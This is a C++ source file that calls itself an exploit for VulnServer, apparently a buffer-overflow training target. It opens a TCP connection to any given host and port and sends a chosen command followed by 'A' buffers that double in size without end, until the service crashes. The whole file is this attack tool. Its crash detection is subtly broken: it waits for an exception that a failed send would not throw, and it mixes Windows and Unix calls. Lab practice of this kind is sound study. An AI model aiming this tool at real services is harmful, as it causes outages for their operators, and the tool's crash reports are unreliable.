//Exploit for VulnServer Made by Gremlin
#include "includesBufferOverflow.h"

void main(int argc, char** argv) {
	if (argc < 2) {
		printf("[+] Usage : FileName.exe [IP] [PORT (Default = 9999)]");
		return;
	}
#if defined(_WIN32)
	WSADATA d;
	if (WSAStartup(MAKEWORD(2, 2), &d)) {
		printf("[-] Failed to initialize socket !");
		return;
	}
#endif
	printf("[+] Configuring remote address...\n");
	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	struct addrinfo* peer_address;
	if (getaddrinfo(argv[1], argv[2] ? argv[2] : "9999", &hints, &peer_address)) {
		printf("[-] getaddrinfo failed !");
		return;
	}
	char address_buffer[100];
	char service_buffer[100];
	getnameinfo(peer_address->ai_addr, peer_address->ai_addrlen, address_buffer, sizeof(address_buffer), service_buffer, sizeof(service_buffer), NI_NUMERICHOST);
	printf("[+] Remote address is : %s\n", address_buffer);
	printf("[+] Remote service is : %s\n", service_buffer);
	//Socket Creation

	printf("[+] Creating socket...\n");
	SOCKET socket_peer;
	socket_peer = socket(peer_address->ai_family, peer_address->ai_socktype, peer_address->ai_protocol);
	if (!ISVALIDSOCKET(socket_peer)) {
		printf("[-] Socket failed !\n");
		return;
	}
	printf("[+] Connecting...\n");
	if (connect(socket_peer, peer_address->ai_addr, peer_address->ai_addrlen)) {
		printf("[-] Connection to target is impossible !\n");
		return;
	}
	freeaddrinfo(peer_address);
	int exploitBytes;
	size_t bufferMultiplier = 10 + 5;
	std::string argument;
	printf("[+] What argument would you like to test against the vulnserver ? : ");
	std::cin >> argument;
	system("clear");
	while (true) {
		try {
			char buffer = 'A';
			std::string exploitBuffer(bufferMultiplier, buffer); //size_t bufferMultiplir, buffer -> this does multiply bufferMultiplier by size_t;
			std::string argExploit = argument + " " + exploitBuffer;
			char* exploits = new char[argExploit.size() + 1]; //New char the size of our std::string
			std::copy(argExploit.begin(), argExploit.end(), exploits); //copy our exploitBuffer into char* exploits
			exploits[argExploit.size()] = '\0'; //Add null byte at the end
			exploitBytes = send(socket_peer, exploits, argExploit.size() + 1, 0); //Send it out
			printf("[+] Sent %d bytes to %s %s\n", exploitBytes, address_buffer, service_buffer); //Print the number of bytes sent
			bufferMultiplier = bufferMultiplier + bufferMultiplier; //bufferMultiplier * 2
			delete[] exploits; //delete our temp exploits buffer
		}
		catch (std::exception& e) {
			printf("[+] Target crashed at %d bytes !", bufferMultiplier);
			return;
		}
	}
}
